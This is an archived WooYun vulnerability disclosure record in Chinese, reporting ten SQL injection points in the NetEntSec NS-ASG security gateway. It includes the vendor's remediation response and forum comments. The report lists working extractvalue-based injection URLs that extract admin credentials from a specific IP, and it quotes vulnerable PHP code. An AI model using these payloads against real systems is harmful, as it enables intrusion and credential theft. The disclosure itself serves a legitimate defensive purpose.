{"id": 3586, "wybug_id": "wooyun-2014-059000", "wybug_title": "网康 NS-ASG 应用安全网关注入漏洞11-20", "wybug_corp": "网康科技", "wybug_author": "小新", "wybug_date": "2014-04-30 17:14", "wybug_open_date": "2014-06-14 17:15", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向公众公开  简要描述： 网康 NS-ASG 应用安全网关注入漏洞合集另外10个注入点，这辈子都不想再看到网康的注入了 详细说明：  \n1. https://202.113.20.208/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x1,%20(select%20@@version)))2. https://202.113.20.208/WebPages/applyhardware.php?action=applyhardware&hard_user=test%2527%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201))) %233. https://202.113.20.208/WebPages/singlelogin.php?loginId=1 %20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201))) %23&submit=t4. https://202.113.20.208/admin/add_getlogin.php?SingleLoginId=1 %20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201))) %235. https://202.113.20.208/admin/add_postlogin.php?SingleLoginId=1 %20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201))) %236. https://202.113.20.208/admin/count_host.php?search=test'%0aand%0aextractvalue(0x1,concat(0x1,@@version))%0aor'%0a&action=find&begintime=%20'ttest%20--%20%20t7. https://202.113.20.208/admin/add_ikev2.php?TunnelId=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201))) %238. https://202.113.20.208/admin/configguide/ipsec_guide_1.php?TunnelId=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201))) %23\n\n9. https://202.113.20.208/3g/index.php  12      $dbh = db_connect();  13      //璁板綍鎵嬫満鍨嬪彿鍙夾GENT淇℃伅  14      $AgentContent = $_SERVER['HTTP_USER_AGENT'];  15      $AcceptContent = $_SERVER['HTTP_ACCEPT'];  16      $time = date(\"Y-m-d H:i:s\",time());  17      $insert = \"insert into MobileInfoTable values(NULL,'$AgentContent','$AcceptContent','$time');\";  18      db_insert($dbh,$insert,\"鎻掑叆鎵嬫満user_agent\");  19      $query=\"select MingCheng from u_Webconf\";   20        21      $res = db_query($dbh, $query, \"鏌ヨ鍙傛暟\");   22      list($MingCheng) = db_fetch_row($res);  23      $MingCheng=gb2utf8($MingCheng);      24      echo \"$MingCheng\\n\";\n$_SERVER['HTTP_USER_AGENT']referer注入\n10. https://202.113.20.208/include/authrp.phpcookie注入<?include(\"common.inc\");if ( !isset($HTTP_COOKIE_VARS['reachstone_uid']) && !isset($HTTP_COOKIE_VARS['reachstone_uid_bak'])){     redirect(\"/WebPages/login.php\");     exit();}/* ---------- authenticate ----------  */     $uid = $HTTP_COOKIE_VARS['reachstone_uid'];     if(!$uid)          $uid = $HTTP_COOKIE_VARS['reachstone_uid_bak'];     $dbh = db_connect();     $query=\"select SessionId from ISCOnLineUser where SessionId=$uid\";     if( $res = db_query($dbh, $query, \"检查用户是否已登录\") )     {          if ( !db_fetch_row($res) )          {               redirect(\"/WebPages/login.php\");               exit();          }     }     else     {          redirect(\"/WebPages/login.php\");          exit();     }?>\n$HTTP_COOKIE_VARS['reachstone_uid']cookie注入   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤啊   版权声明：转载请注明来源 小新@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-05-01 22:07 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-30 17:17 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  我那个去呀，这网康是什么情况呀！    \n     2014-04-30 17:18 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  这..未免也太屌了吧    \n     2014-04-30 17:22 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  我也不挖了，这系统漫天都是洞。。。估计网康的所有设备都这样。。。谁用谁知道。。。从没见过这么烂的设备    \n     2014-04-30 17:23 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  @狗狗侠 好吧，连你都不挖了，剩下的我就不继续刷了    \n     2014-04-30 18:00 |    \t\t倪明 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:13        | 倪明，中关村二小)\t\t \n  @狗狗侠 @小新 代码像小学生写的一样    \n     2014-04-30 18:21 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  在乌云打了一天的广告    \n     2014-04-30 18:22 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这产品废了    \n     2014-04-30 18:35 |    \t\t小夜 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 漫长的日子)\t\t \n  网康中枪杆上了    \n     2014-04-30 19:29 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  不好吧，网康是什么，有点叼啊    \n     2014-04-30 21:29 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  @狗狗侠 @倪明 话说网康没有要你们的联系方式查水表么    \n     2014-04-30 22:07 |    \t\t倪明 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:13        | 倪明，中关村二小)\t\t \n  @小新 要了    \n     2014-05-01 08:41 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @小新 有点意思    \n     2014-05-01 22:15 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  厂商的态度点1008611个赞！    \n     2014-06-14 17:32 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  这中5是什么情况？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}